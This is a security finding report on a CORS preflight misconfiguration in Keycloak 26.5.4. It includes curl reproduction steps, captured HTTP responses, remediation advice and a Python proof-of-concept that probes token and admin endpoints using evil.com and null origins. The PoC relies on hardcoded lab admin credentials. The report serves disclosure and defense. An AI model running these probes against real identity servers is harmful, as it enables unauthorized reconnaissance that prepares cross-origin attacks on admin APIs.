# Finding #1: CORS OPTIONS Preflight Bypass

| Field | Value |
|---|---|
| **Severity** | MEDIUM (CVSS 5.3) |
| **Vulnerability Type** | Cross-Origin Resource Sharing (CORS) Misconfiguration |
| **Affected Version** | Keycloak 26.5.4 (latest stable, confirmed reproducible) |
| **Affected Components** | OIDC Token Endpoint, UserInfo Endpoint, Admin REST API (`/admin/realms/*`) |
| **Reproducibility** | 100% |
| **Date Validated** | 2026-02-21 |

---

## Summary

Keycloak's CORS filter correctly restricts the `Access-Control-Allow-Origin` (ACAO) header in actual responses (GET/POST) to origins listed in the client's `webOrigins` configuration. However, for `OPTIONS` preflight requests, the filter reflects **any** `Origin` header value with `Access-Control-Allow-Credentials: true`, regardless of whether the origin is in the allowlist. This means the per-client `webOrigins` configuration has zero enforcement effect on preflight, enabling write-CSRF and null-origin bypass attacks.

---

## Detailed Description

When a browser makes a cross-origin request that triggers a preflight check (e.g., POST with `Content-Type: application/json`, or any request with an `Authorization` header), it first sends an `OPTIONS` request. The server's preflight response determines whether the browser proceeds with the actual request.

Keycloak's CORS implementation has an asymmetry:

- **Actual responses** (POST, GET, etc.): The `Access-Control-Allow-Origin` header is only set if the requesting origin matches the client's `webOrigins` configuration. This is correct behavior.
- **OPTIONS preflight responses**: The `Access-Control-Allow-Origin` header is set to **whatever origin the client sends**, regardless of the `webOrigins` configuration. `Access-Control-Allow-Credentials: true` is also always included.

This creates two concrete attack surfaces:

1. **Write-CSRF via admin API:** If an attacker obtains a valid admin Bearer token (via social engineering, leaked credentials, etc.), JavaScript from `evil.com` can pass the preflight check and send write requests (create backdoor users, delete clients, modify realm settings) to the admin API. The server-side action completes before the browser blocks reading the response.

2. **null-origin bypass:** The `Origin: null` header (generated by `file://`, `data:` URIs, `<iframe sandbox>`) is also reflected with `credentials: true`, bypassing all `webOrigins` restrictions at the preflight level.

### Key Behavior Table

Client configuration: `webOrigins: ["https://legitimate-app.com"]`

| Request Type | Origin | ACAO in Response | Credentials |
|---|---|---|---|
| `OPTIONS` preflight | `https://evil.com` | `https://evil.com` | `true` |
| `OPTIONS` preflight | `null` | `null` | `true` |
| `POST /token` (actual) | `https://evil.com` | **absent** | -- |
| `GET /admin/realms/test/users` (actual) | `https://evil.com` | **absent** | -- |

The first two rows demonstrate the vulnerability. The last two rows show that actual response enforcement works correctly -- but this does not prevent write-CSRF, because the server-side mutation has already completed by the time the browser blocks the response.

## Steps to Reproduce

**Prerequisites:**
- Realm: `test`
- Client: `webapp` (public), `webOrigins: ["https://legitimate-app.com"]`

### Step 1 -- Verify webOrigins is configured

```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s "http://46.101.162.187:8080/admin/realms/test/clients?clientId=webapp" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import sys,json; print('webOrigins:', json.load(sys.stdin)[0]['webOrigins'])"
# Output: webOrigins: ['https://legitimate-app.com']
```

### Step 2 -- OPTIONS preflight from evil.com (BYPASSED)

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type,Authorization"
```

**Expected:** No `Access-Control-Allow-Origin` header (origin not in webOrigins)

**Actual:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Origin, X-Requested-With, Accept, Authorization, Content-Type
Access-Control-Max-Age: 3600
```

### Step 3 -- null-origin bypass

```bash
curl -si -X OPTIONS http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: POST"
```

**Actual:**
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

The `null` origin is reflected. This allows attacks from sandboxed iframes (`<iframe sandbox>`), `file://` URIs, and `data:` URIs.

### Step 4 -- Admin API OPTIONS bypass

```bash
curl -si -X OPTIONS http://46.101.162.187:8080/admin/realms/test/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type"
```

**Actual:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
Access-Control-Allow-Credentials: true
```

The admin API preflight is also fully bypassed.

### Step 5 -- Actual POST (control test -- correctly restricted)

```bash
curl -si -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
```

```http
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
# NO Access-Control-Allow-Origin header -- browser blocks JS from reading response
```

The actual response correctly omits the ACAO header. However, the server-side token issuance has already completed. This confirms that write-CSRF is possible: the attacker cannot read the response, but the server-side action (user creation, client deletion, realm modification) executes.

---

## Impact

- **Authorization policy bypass:** The `webOrigins` per-client configuration is not enforced for OPTIONS preflight, meaning administrators who configured origin restrictions have a false sense of security.
- **Write-CSRF for admin API:** If an attacker has obtained a valid admin Bearer token through another vector, they can send destructive write requests (create backdoor users, delete clients, modify realm settings) from any origin. The server-side mutation completes before the browser blocks the response.
- **null-origin universal bypass:** Any OIDC client's webOrigins restriction can be bypassed at the preflight level using `Origin: null` (from sandboxed iframes, `file://` URIs, `data:` URIs).
- **Note:** Actual response reading is correctly blocked for non-allowed origins. Token theft via response reading is NOT possible for correctly-configured clients.

---

## Recommendations

1. **Apply webOrigins to OPTIONS responses:** The same origin validation logic that is already applied to actual responses must also be applied to OPTIONS preflight responses. If the requesting origin is not in the client's `webOrigins` list, the preflight response must not include `Access-Control-Allow-Origin`.

2. **Reject `Origin: null`:** Never return `Access-Control-Allow-Origin: null` with `Access-Control-Allow-Credentials: true`. The `null` origin should be explicitly blocked, as it is used by sandboxed contexts and is inherently untrustworthy.

3. **Restrict admin API preflight:** The admin REST API should restrict preflight responses to the admin console origin only, rather than reflecting any origin.

## Automated PoC Script

**File:** `pocs/poc_f1_cors_bypass.py`

**Usage:** `python3 poc_f1_cors_bypass.py [--host http://TARGET:8080]`

```python
#!/usr/bin/env python3
"""
Finding #1: CORS OPTIONS Preflight Bypass
Severity: MEDIUM (CVSS 5.3)
Target: Keycloak 26.5.4

Demonstrates that webOrigins client configuration is NOT enforced for
OPTIONS preflight requests, allowing any origin to pass preflight checks.
"""

import http.client
import json
import argparse
import sys

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #1: CORS OPTIONS Preflight Bypass                   ║
║  Severity: MEDIUM (CVSS 5.3)                                 ║
║  Keycloak 26.5.4 — CORS Misconfiguration                    ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def get_admin_token(host, port):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    conn.request("POST", "/realms/master/protocol/openid-connect/token",
                 body, {"Content-Type": "application/x-www-form-urlencoded"})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode())
    conn.close()
    return data.get("access_token")

def send_options(host, port, path, origin):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    headers = {
        "Origin": origin,
        "Access-Control-Request-Method": "POST",
        "Access-Control-Request-Headers": "Content-Type,Authorization"
    }
    conn.request("OPTIONS", path, headers=headers)
    resp = conn.getresponse()
    resp_headers = {k.lower(): v for k, v in resp.getheaders()}
    resp.read()
    conn.close()
    return resp.status, resp_headers

def send_post(host, port, path, origin, body, extra_headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    headers = {
        "Origin": origin,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if extra_headers:
        headers.update(extra_headers)
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    resp_headers = {k.lower(): v for k, v in resp.getheaders()}
    resp_body = resp.read().decode()
    conn.close()
    return resp.status, resp_headers, resp_body

def main():
    parser = argparse.ArgumentParser(description="Finding #1: CORS OPTIONS Preflight Bypass PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    banner()
    info(f"Target: {host}:{port}")
    realm = "test"
    token_path = f"/realms/{realm}/protocol/openid-connect/token"
    admin_path = f"/admin/realms/{realm}/users"
    evil_origin = "https://evil.com"
    null_origin = "null"
    results = []

    # ── Step 1: Verify webOrigins config ──
    step(1, "Verifying client webOrigins configuration...")
    try:
        admin_token = get_admin_token(host, port)
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request("GET", f"/admin/realms/{realm}/clients?clientId=webapp",
                     headers={"Authorization": f"Bearer {admin_token}"})
        resp = conn.getresponse()
        clients = json.loads(resp.read().decode())
        conn.close()
        web_origins = clients[0].get("webOrigins", []) if clients else []
        success(f"Client 'webapp' webOrigins: {web_origins}")
        if web_origins:
            info(f"Only {web_origins} should be allowed — let's test evil.com")
        print()
    except Exception as e:
        fail(f"Could not verify config: {e}")
        print()

    # ── Step 2: OPTIONS preflight from evil.com → token endpoint ──
    step(2, f"OPTIONS preflight from {evil_origin} → token endpoint")
    status, hdrs = send_options(host, port, token_path, evil_origin)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    print(f"    Access-Control-Allow-Credentials: {acac or '(absent)'}")
    if acao == evil_origin and acac == "true":
        fail(f"VULNERABLE — evil.com reflected with credentials:true!")
        results.append(("Token OPTIONS (evil.com)", True))
    else:
        success("Not vulnerable — origin correctly rejected")
        results.append(("Token OPTIONS (evil.com)", False))
    print()

    # ── Step 3: OPTIONS preflight from null origin ──
    step(3, f"OPTIONS preflight from Origin: null → token endpoint")
    status, hdrs = send_options(host, port, token_path, null_origin)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    print(f"    Access-Control-Allow-Credentials: {acac or '(absent)'}")
    if acao == "null" and acac == "true":
        fail("VULNERABLE — null origin reflected! (sandboxed iframe bypass)")
        results.append(("Token OPTIONS (null)", True))
    else:
        success("Not vulnerable")
        results.append(("Token OPTIONS (null)", False))
    print()

    # ── Step 4: OPTIONS preflight from evil.com → admin API ──
    step(4, f"OPTIONS preflight from {evil_origin} → admin API")
    status, hdrs = send_options(host, port, admin_path, evil_origin)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    print(f"    Access-Control-Allow-Credentials: {acac or '(absent)'}")
    if acao == evil_origin and acac == "true":
        fail("VULNERABLE — admin API preflight bypassed!")
        results.append(("Admin OPTIONS (evil.com)", True))
    else:
        success("Not vulnerable")
        results.append(("Admin OPTIONS (evil.com)", False))
    print()

    # ── Step 5: Actual POST with evil.com origin (control — should be blocked) ──
    step(5, f"Actual POST from {evil_origin} → token endpoint (control test)")
    body = "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
    status, hdrs, resp_body = send_post(host, port, token_path, evil_origin, body)
    acao = hdrs.get("access-control-allow-origin", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    if not acao:
        success("Actual response correctly has NO ACAO header (browser blocks reading)")
        info("Server-side action still completes — write-CSRF possible!")
    else:
        fail(f"ACAO present in actual response: {acao}")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:40s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  - webOrigins per-client config has NO enforcement on OPTIONS preflight
  - Any origin passes preflight → write-CSRF possible with stolen Bearer token
  - null origin bypass enables sandboxed iframe / data: URI attacks
  - Admin API preflight is also bypassed → destructive admin write-CSRF

{YELLOW}Root Cause:{RESET}
  Keycloak's CORS filter reflects ANY Origin in OPTIONS responses without
  checking the client's webOrigins allowlist. Only actual responses enforce it.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} tests show vulnerability{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All tests passed — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```
